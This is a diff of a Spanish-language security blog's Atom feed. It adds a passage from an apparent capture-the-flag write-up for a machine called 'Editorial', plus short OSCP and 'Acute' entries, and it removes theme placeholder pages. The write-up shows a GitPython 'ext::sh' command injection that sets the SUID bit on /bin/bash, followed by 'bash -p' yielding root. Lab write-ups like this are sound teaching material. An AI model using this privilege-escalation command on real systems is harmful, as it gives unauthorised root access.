+    proc.wait<span class="o">(</span><span class="k">**</span>kwargs<span class="o">)</span>
+  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/cmd.py"</span>, line 559, <span class="k">in </span><span class="nb">wait
+    </span>raise GitCommandError<span class="o">(</span>remove_password_if_present<span class="o">(</span>self.args<span class="o">)</span>, status, errstr<span class="o">)</span>
+git.exc.GitCommandError: Cmd<span class="o">(</span><span class="s1">'git'</span><span class="o">)</span> failed due to: <span class="nb">exit </span>code<span class="o">(</span>128<span class="o">)</span>
+  cmdline: git clone <span class="nt">-v</span> <span class="nt">-c</span> protocol.ext.allow<span class="o">=</span>always ext::sh <span class="nt">-c</span> <span class="nb">chmod</span>% u+s /bin/bash new_changes
+  stderr: <span class="s1">'Cloning into '</span>new_changes<span class="s1">'...
+chmod: missing operand after '</span>u+s<span class="s1">'
+Try '</span><span class="nb">chmod</span> <span class="nt">--help</span><span class="s1">' for more information.
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.
+'</span>
+bash-5.1<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
+<span class="nt">-rwsr-xr-x</span> 1 root root 1396520 Mar 14 11:31 /bin/bash
+bash-5.1<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-5.1# <span class="nb">whoami
+</span>root
+</code></pre></div></div>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="machines" /><summary type="html"><![CDATA[Los primero pasos es escanear la máquina para saber que puertos están abiertos.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/machines/editorial/logo.png" /><media:content medium="image" url="http://localhost:4000/assets/img/machines/editorial/logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">OSCP</title><link href="http://localhost:4000/certifications/oscp.html" rel="alternate" type="text/html" title="OSCP" /><published>2024-06-21T00:00:00-06:00</published><updated>2024-06-21T00:00:00-06:00</updated><id>http://localhost:4000/certifications/oscp</id><content type="html" xml:base="http://localhost:4000/certifications/oscp.html"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="certifications" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/OSCP.png" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/OSCP.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Acute</title><link href="http://localhost:4000/machine.html" rel="alternate" type="text/html" title="Acute" /><published>2024-06-20T00:00:00-06:00</published><updated>2024-06-20T00:00:00-06:00</updated><id>http://localhost:4000/machine</id><content type="html" xml:base="http://localhost:4000/machine.html"><![CDATA[<p>Lo más relevante de esta máquina fue</p>
 
 <p>pudimos usar <code class="language-plaintext highlighter-rouge">exiftools</code> para poder ver los metadatos del archivo encontrado en la web</p>
 
@@ -485,319 +941,4 @@ A caption to an image.</p>
 </blockquote>
 
 <h2 id="faded-text">Faded text</h2>
-<p class="faded">I’m faded, faded, faded.</p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><summary type="html"><![CDATA[A page showing Hydejack-specific markdown content.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/example-content-iii.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/example-content-iii.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Example Content II</title><link href="http://localhost:4000/example-content-ii.html" rel="alternate" type="text/html" title="Example Content II" /><published>2017-11-23T00:00:00-06:00</published><updated>2017-11-23T00:00:00-06:00</updated><id>http://localhost:4000/example-content-ii</id><content type="html" xml:base="http://localhost:4000/example-content-ii.html"><![CDATA[<p>There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.</p>
-
-<p>There should be whitespace between paragraphs.</p>
-
-<p>Text can be <strong>bold</strong>, <em>italic</em>, or <del>strikethrough</del>.</p>
-
-<p><a href="another-page">Link to another page</a>.</p>
-
-<ul class="large-only" id="markdown-toc">
-  <li><a href="#header-2" id="markdown-toc-header-2">Header 2</a>    <ul>
-      <li><a href="#header-3" id="markdown-toc-header-3">Header 3</a>        <ul>
-          <li><a href="#header-4" id="markdown-toc-header-4">Header 4</a>            <ul>
-              <li><a href="#header-5" id="markdown-toc-header-5">Header 5</a>                <ul>
-                  <li><a href="#header-6" id="markdown-toc-header-6">Header 6</a></li>
-                </ul>
-              </li>
-            </ul>
-          </li>
-        </ul>
-      </li>
-      <li><a href="#theres-a-horizontal-rule-below-this" id="markdown-toc-theres-a-horizontal-rule-below-this">There’s a horizontal rule below this.</a></li>
-      <li><a href="#here-is-an-unordered-list" id="markdown-toc-here-is-an-unordered-list">Here is an unordered list:</a></li>
-      <li><a href="#and-an-ordered-list" id="markdown-toc-and-an-ordered-list">And an ordered list:</a></li>
-      <li><a href="#and-a-nested-list" id="markdown-toc-and-a-nested-list">And a nested list:</a></li>
-      <li><a href="#small-image" id="markdown-toc-small-image">Small image</a></li>
-      <li><a href="#large-image" id="markdown-toc-large-image">Large image</a></li>
-      <li><a href="#definition-lists" id="markdown-toc-definition-lists">Definition lists</a></li>
-    </ul>
-  </li>
-</ul>
-
-<h2 id="header-2">Header 2</h2>
-
-<p>This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.</p>
-
-<h3 id="header-3">Header 3</h3>
-
-<blockquote>
-  <p>This is a blockquote following a header.</p>
-
-  <p>When something is important enough, you do it even if the odds are not in your favor.</p>
-</blockquote>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Javascript code with syntax highlighting.</span>
-<span class="kd">var</span> <span class="nx">fun</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">lang</span><span class="p">(</span><span class="nx">l</span><span class="p">)</span> <span class="p">{</span>
-  <span class="nx">dateformat</span><span class="p">.</span><span class="nx">i18n</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./lang/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">l</span><span class="p">)</span>
-  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Ruby code with syntax highlighting</span>
-<span class="no">GitHubPages</span><span class="o">::</span><span class="no">Dependencies</span><span class="p">.</span><span class="nf">gems</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">gem</span><span class="p">,</span> <span class="n">version</span><span class="o">|</span>
-  <span class="n">s</span><span class="p">.</span><span class="nf">add_dependency</span><span class="p">(</span><span class="n">gem</span><span class="p">,</span> <span class="s2">"= </span><span class="si">#{</span><span class="n">version</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
-<span class="k">end</span>
-</code></pre></div></div>
-
-<h4 id="header-4">Header 4</h4>
-
-<ul>
-  <li>This is an unordered list following a header.</li>
-  <li>This is an unordered list following a header.</li>
-  <li>This is an unordered list following a header.</li>
-</ul>
-
-<h5 id="header-5">Header 5</h5>
-
-<ol>
-  <li>This is an ordered list following a header.</li>
-  <li>This is an ordered list following a header.</li>
-  <li>This is an ordered list following a header.</li>
-</ol>
-
-<h6 id="header-6">Header 6</h6>
-
-<table>
-  <thead>
-    <tr>
-      <th style="text-align: left">head1</th>
-      <th style="text-align: left">head two</th>
-      <th style="text-align: left">three</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td style="text-align: left">ok</td>
-      <td style="text-align: left">good swedish fish</td>
-      <td style="text-align: left">nice</td>
-    </tr>
-    <tr>
-      <td style="text-align: left">out of stock</td>
-      <td style="text-align: left">good and plenty</td>
-      <td style="text-align: left">nice</td>
-    </tr>
-    <tr>
-      <td style="text-align: left">ok</td>
-      <td style="text-align: left">good <code class="language-plaintext highlighter-rouge">oreos</code></td>
-      <td style="text-align: left">hmm</td>
-    </tr>
-    <tr>
-      <td style="text-align: left">ok</td>
-      <td style="text-align: left">good <code class="language-plaintext highlighter-rouge">zoute</code> drop</td>
-      <td style="text-align: left">yumm</td>
-    </tr>
-  </tbody>
-</table>
-
-<h3 id="theres-a-horizontal-rule-below-this">There’s a horizontal rule below this.</h3>
-
-<hr />
-
-<h3 id="here-is-an-unordered-list">Here is an unordered list:</h3>
-
-<ul>
-  <li>Item foo</li>
-  <li>Item bar</li>
-  <li>Item baz</li>
-  <li>Item zip</li>
-</ul>
-
-<h3 id="and-an-ordered-list">And an ordered list:</h3>
-
-<ol>
-  <li>Item one</li>
-  <li>Item two</li>
-  <li>Item three</li>
-  <li>Item four</li>
-</ol>
-
-<h3 id="and-a-nested-list">And a nested list:</h3>
-
-<ul>
-  <li>level 1 item
-    <ul>
-      <li>level 2 item</li>
-      <li>level 2 item
-        <ul>
-          <li>level 3 item</li>
-          <li>level 3 item</li>
-        </ul>
-      </li>
-    </ul>
-  </li>
-  <li>level 1 item
-    <ul>
-      <li>level 2 item</li>
-      <li>level 2 item</li>
-      <li>level 2 item</li>
-    </ul>
-  </li>
-  <li>level 1 item
-    <ul>
-      <li>level 2 item</li>
-      <li>level 2 item</li>
-    </ul>
-  </li>
-  <li>level 1 item</li>
-</ul>
-
-<h3 id="small-image">Small image</h3>
-
-<p><img src="https://assets-cdn.github.com/images/icons/emoji/octocat.png" alt="" /></p>
-
-<h3 id="large-image">Large image</h3>
-
-<p><img src="https://guides.github.com/activities/hello-world/branching.png" alt="" /></p>
-
-<h3 id="definition-lists">Definition lists</h3>
-
-<dl>
-  <dt>Name</dt>
-  <dd>Godzilla</dd>
-  <dt>Born</dt>
-  <dd>1952</dd>
-  <dt>Birthplace</dt>
-  <dd>Japan</dd>
-  <dt>Color</dt>
-  <dd>Green</dd>
-</dl>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this. Or is it?
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The final element.
-</code></pre></div></div>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><summary type="html"><![CDATA[A page showing how regular markdown content is styled in Hydejack.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/example-content-ii.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/example-content-ii.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Example Content</title><link href="http://localhost:4000/example-content.html" rel="alternate" type="text/html" title="Example Content" /><published>2012-02-07T00:00:00-06:00</published><updated>2012-02-07T00:00:00-06:00</updated><id>http://localhost:4000/example-content</id><content type="html" xml:base="http://localhost:4000/example-content.html"><![CDATA[<p>Cum sociis natoque penatibus et magnis <a href="#">dis parturient montes</a>, nascetur ridiculus mus. <em>Aenean eu leo quam.</em> Pellentesque ornare sem lacinia quam venenatis vestibulum. Sed posuere consectetur est at lobortis. Cras mattis consectetur purus sit amet fermentum.</p>
-
-<blockquote>
-  <p>Curabitur blandit tempus porttitor. Nullam quis risus eget urna mollis ornare vel eu leo. Nullam id dolor id nibh ultricies vehicula ut id elit.</p>
-</blockquote>
-
-<p>Etiam porta <strong>sem malesuada magna</strong> mollis euismod. Cras mattis consectetur purus sit amet fermentum. Aenean lacinia bibendum nulla sed consectetur.</p>
-
-<h2 id="inline-html-elements">Inline <abbr title="HyperText Markup Language">HTML</abbr> elements</h2>
-
-<p><abbr title="HyperText Markup Language">HTML</abbr> defines a long list of available inline tags, a complete list of which can be found on the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element">Mozilla Developer Network</a>.</p>
-
-<ul>
-  <li><strong>To bold text</strong>, use <code class="language-plaintext highlighter-rouge">**To bold text**</code>.</li>
-  <li><em>To italicize text</em>, use <code class="language-plaintext highlighter-rouge">*To italicize text*</code>.</li>
-  <li>Abbreviations, like <abbr title="HyperText Markup Language">HTML</abbr> should be defined like this <code class="language-plaintext highlighter-rouge">*[HTML]: HyperText Markup Language</code>.</li>
-  <li>Citations, like <cite>— Mark otto</cite>, should use <code class="language-plaintext highlighter-rouge">&lt;cite&gt;</code>.</li>
-  <li><del>Deleted</del> text should use <code class="language-plaintext highlighter-rouge">~~deleted~~</code> and <ins>inserted</ins> text should use <code class="language-plaintext highlighter-rouge">&lt;ins&gt;</code>.</li>
-  <li>Superscript <sup>text</sup> uses <code class="language-plaintext highlighter-rouge">&lt;sup&gt;</code> and subscript <sub>text</sub> uses <code class="language-plaintext highlighter-rouge">&lt;sub&gt;</code>.</li>
-</ul>
-
-<p>Most of these elements are styled by browsers with few modifications on our part.</p>
-
-<h2 id="heading-2">Heading 2</h2>
-<p>Vivamus sagittis lacus vel augue rutrum faucibus dolor auctor. Duis mollis, est non commodo luctus, nisi erat porttitor ligula, eget lacinia odio sem nec elit. Morbi leo risus, porta ac consectetur ac, vestibulum at eros.</p>
-
-<h3 id="heading-3">Heading 3</h3>
-<p>Vivamus sagittis lacus vel augue rutrum faucibus dolor auctor.</p>
-
-<h4 id="heading-4">Heading 4</h4>
-<p>Vivamus sagittis lacus vel augue rutrum faucibus dolor auctor.</p>
-
-<h5 id="heading-5">Heading 5</h5>
-<p>Vivamus sagittis lacus vel augue rutrum faucibus dolor auctor.</p>
-
-<h6 id="heading-6">Heading 6</h6>
-<p>Vivamus sagittis lacus vel augue rutrum faucibus dolor auctor.</p>
-
-<h2 id="code">Code</h2>
-
-<p>Cum sociis natoque penatibus et magnis dis <code class="language-plaintext highlighter-rouge">code element</code> montes, nascetur ridiculus mus.</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Example can be run directly in your JavaScript console</span>
-
-<span class="c1">// Create a function that takes two arguments and returns the sum of those</span>
-<span class="c1">// arguments</span>
-<span class="kd">var</span> <span class="nx">adder</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Function</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">b</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">return a + b</span><span class="dl">"</span><span class="p">);</span>
-
-<span class="c1">// Call the function</span>
-<span class="nx">adder</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
-<span class="c1">// &gt; 8</span>
-</code></pre></div></div>
-
-<h2 id="lists">Lists</h2>
-
-<p>Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Aenean lacinia bibendum nulla sed consectetur. Etiam porta sem malesuada magna mollis euismod. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus.</p>
-
-<ul>
-  <li>Praesent commodo cursus magna, vel scelerisque nisl consectetur et.</li>
-  <li>Donec id elit non mi porta gravida at eget metus.</li>
-  <li>Nulla vitae elit libero, a pharetra augue.</li>
-</ul>
-
-<p>Donec ullamcorper nulla non metus auctor fringilla. Nulla vitae elit libero, a pharetra augue.</p>
-
-<ol>
-  <li>Vestibulum id ligula porta felis euismod semper.</li>
-  <li>Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.</li>
-  <li>Maecenas sed diam eget risus varius blandit sit amet non magna.</li>
-</ol>
-
-<p>Cras mattis consectetur purus sit amet fermentum. Sed posuere consectetur est at lobortis.</p>
-
-<dl>
-  <dt>HyperText Markup Language (<abbr title="HyperText Markup Language">HTML</abbr>)</dt>
-  <dd>The language used to describe and define the content of a Web page</dd>
-  <dt>Cascading Style Sheets (<abbr title="Cascading Style Sheets">CSS</abbr>)</dt>
-  <dd>Used to describe the appearance of Web content</dd>
-  <dt>JavaScript (<abbr title="JavaScript">JS</abbr>)</dt>
-  <dd>The programming language used to build advanced Web sites and applications</dd>
-</dl>
-
-<p>Integer posuere erat a ante venenatis dapibus posuere velit aliquet. Morbi leo risus, porta ac consectetur ac, vestibulum at eros. Nullam quis risus eget urna mollis ornare vel eu leo.</p>
-
-<h2 id="images">Images</h2>
-
-<p>Quisque consequat sapien eget quam rhoncus, sit amet laoreet diam tempus. Aliquam aliquam metus erat, a pulvinar turpis suscipit at.</p>
-
-<p><img src="https://via.placeholder.com/800x400" alt="800x400" title="Large example image" /></p>
-
-<p><img src="https://via.placeholder.com/400x200" alt="400x200" title="Medium example image" /></p>
-
-<p><img src="https://via.placeholder.com/200x200" alt="200x200" title="Small example image" /></p>
-
-<h2 id="tables">Tables</h2>
-
-<p>Aenean lacinia bibendum nulla sed consectetur. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</p>
-
-<table>
-  <thead>
-    <tr>
-      <th style="text-align: left">Name</th>
-      <th style="text-align: left">Upvotes</th>
-      <th style="text-align: left">Downvotes</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td style="text-align: left">Alice</td>
-      <td style="text-align: left">10</td>
-      <td style="text-align: left">11</td>
-    </tr>
-    <tr>
-      <td style="text-align: left">Bob</td>
-      <td style="text-align: left">4</td>
-      <td style="text-align: left">3</td>
-    </tr>
-    <tr>
-      <td style="text-align: left">Charlie</td>
-      <td style="text-align: left">7</td>
-      <td style="text-align: left">9</td>
-    </tr>
-  </tbody>
-  <tfoot>
-    <tr>
-      <td style="text-align: left">Totals</td>
-      <td style="text-align: left">21</td>
-      <td style="text-align: left">23</td>
-    </tr>
-  </tfoot>
-</table>
-
-<p>Nullam id dolor id nibh ultricies vehicula ut id elit. Sed posuere consectetur est at lobortis. Nullam quis risus eget urna mollis ornare vel eu leo.</p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><summary type="html"><![CDATA[Howdy! This is an example blog post that shows several types of HTML content supported in this theme.]]></summary></entry></feed>
+<p class="faded">I’m faded, faded, faded.</p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><summary type="html"><![CDATA[A page showing Hydejack-specific markdown content.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/example-content-iii.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/example-content-iii.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
